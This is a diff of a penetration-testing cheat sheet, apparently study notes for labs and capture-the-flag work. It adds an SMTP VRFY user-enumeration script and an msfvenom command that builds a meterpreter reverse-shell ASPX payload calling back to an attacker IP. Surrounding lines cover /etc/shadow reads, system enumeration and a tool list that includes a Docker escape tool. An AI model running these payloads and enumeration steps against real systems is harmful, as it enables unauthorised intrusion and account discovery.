@@ -66,7 +66,7 @@ theharvester -d <DOMAIN> -b <DATASOURCE>
 ```bash
 # Look for A record / IP Address
 host <DOMAIN>
-# Look for MX record
+# Look for MX record / mailservers
 host -t mx <DOMAIN>
 # Look for TXT record
 host -t txt <DOMAIN>
@@ -256,6 +256,39 @@ SMTP-Enumeration with netcat
 for user in $(cat typical_usernames_SMTP_Enumeration.txt); do echo VRFY $user |nc -nv -w 1 <Target-IP> 25 2>/dev/null |grep ^"250";done
 ```
 
+SMTP-Enumeration Script
+TODO: extend for reading users from file
+```python
+#!/usr/bin/python 
+ 
+import socket 
+import sys 
+ 
+if len(sys.argv) != 2: 
+ print "Usage: vrfy.py <username>" 
+ sys.exit(0) 
+ 
+# Create a Socket 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+ 
+# Connect to the Server 
+connect = s.connect(('<IP>',25)) 
+ 
+# Receive the banner 
+banner = s.recv(1024) 
+ 
+print banner 
+ 
+# VRFY a user 
+s.send('VRFY ' + sys.argv[1] + '\r\n') 
+result = s.recv(1024) 
+ 
+print result 
+ 
+# Close the socket 
+s.close()
+```
+
 ## SNMP-Enumeration
 
 Scan for open SNMP ports with nmap
@@ -424,6 +457,19 @@ busybox httpd -f -p 9090
 
 
 # Exploiting
+## Metasploit Magic
+
+### MSFvenom / Metasploit payloads
+```bash
+# Windowssystem, e.g. with IIS
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
+```
+
+### Metasploit local exploit suggester
+Change to a writeable directory before usage for better results.
+```bash
+meterpreter> run post/multi/recon/local_exploit_suggester
+```
 
 ## Webshells
 Webshells are in the following directory on Kali:
@@ -587,11 +633,21 @@ cat /etc/shadow
 find / -perm -2 ! -type l -ls 2>/dev/null
 ```
 
+### List services with systemctl
+```bash
+systemctl list-unit-files
+```
+
 ## Local Windows Enumeration
 
 ### hosts file
 ```cmd
 type c:\windows\system32\drivers\etc\hosts
+```
+
+### boot.ini file
+```cmd
+type c:\boot.ini
 ```
 
 ### Open Ports local
@@ -840,6 +896,24 @@ If you are root in a container, try to use the following tool:
 
 # Stuff you also may need
 
+## Bash scripting variables
+| Variable name | Description |
+|:---------------:|:-------------|
+|$0|name of bash script|
+|$1 - $9| first 9 arguments of bash script|
+|$#| number of arguments passed to script|
+|$@|all arguments passed to bash script|
+|$?|exist status of most recently run process|
+|\$\$|process id of current script|
+|$USER|username of user running the script|
+|$HOSTNAME|hostname of machine|
+|$RANDOM|a random number|
+|$LINENO|current line number in the script|
+
+
+
+
+
 ## Wireshark
 ### Display Filters
 ``` 
@@ -881,9 +955,69 @@ Attacking Weak RSA Keys:
 python3 RsaCtfTool.py --publickey <PUBLIC KEY> --uncipherfile <CIPHERED FILE>
 ```
 
-## Firefox Plugins you may need
-- Foxy Proxy
-- Cookie-Editor
-
 ## URL Encodings
-%20 = Space
+|encoded|symbol|
+|---------|-------|
+|%20| Space|
+|%21|!|
+|%22|"|
+|%23|#|
+|%24|$|
+|%25|%|
+|%26|&|
+|%27|'|
+|%28|(|
+|%29|)|
+|%2A|**|
+|%2B|+|
+|%2C|,|
+|%2D|-|
+|%2E|.|
+|%2F|/|
+|%3A|:|
+|%3B|;|
+|%3C|<|
+|%3D|=|
+|%3E|>|
+|%3F|?|
+|%40|@|
+|%5B|\[|
+|%5C|\|
+|%5D|]|
+|%7B|{|
+|%7C|\||
+|%7D|}|
+
+## Firefox Plugins you may need
+- Cookie-Editor
+- Foxy Proxy
+- Wappalyzer
+
+## Tool Collection
+- axel
+- BurpSuite
+- dirb
+- dirbuster
+- DNSRecon
+- DNSenum
+- Docker Escapte Tool [https://github.com/PercussiveElbow/docker-escape-tool](https://github.com/PercussiveElbow/docker-escape-tool)
+- evil-winrm
+- fuff - fuzz faster u fool [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)4
+- LinEnum
+- LinPEAS
+- masscan
+- Metasploit
+- nbtscan
+- nc / Netcat
+- nikto
+- nmap
+- onesixtyone
+- powercat
+- RsaCtfTool [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
+- Searchsploit
+- snmpwalk
+- socat
+- tcpdump
+- theharvester
+- wireshark
+- 
